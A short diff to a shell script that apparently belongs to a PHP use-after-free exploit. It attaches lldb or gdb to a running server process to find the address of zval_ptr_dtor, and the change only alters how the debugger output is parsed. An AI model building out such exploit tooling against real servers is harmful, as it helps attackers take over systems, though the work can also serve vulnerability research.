@@ -122,10 +122,10 @@ if [ "$UAF" = yes ]; then
   DTOR=""
   if [ -n "$SRV_PID" ] && command -v lldb >/dev/null; then
     DTOR=$(lldb -p "$SRV_PID" -batch -o "image lookup -n zval_ptr_dtor" -o quit 2>/dev/null \
-      | awk '/zval_ptr_dtor/ {for(i=1;i<=NF;i++) if($i ~ /^0x/) {print $i; exit}}' || true)
+      | grep 'Address:' | grep -oE '0x[0-9a-fA-F]+' | head -1 || true)
   elif [ -n "$SRV_PID" ] && command -v gdb >/dev/null; then
     DTOR=$(gdb -p "$SRV_PID" -batch -ex "info address zval_ptr_dtor" 2>/dev/null \
-      | awk '/zval_ptr_dtor/ {print $3; exit}' || true)
+      | grep -iE 'is at' | grep -oE '0x[0-9a-fA-F]+' | head -1 || true)
   fi
   if [ -n "$DTOR" ]; then
     echo "[*] auto-detected zval_ptr_dtor = $DTOR"
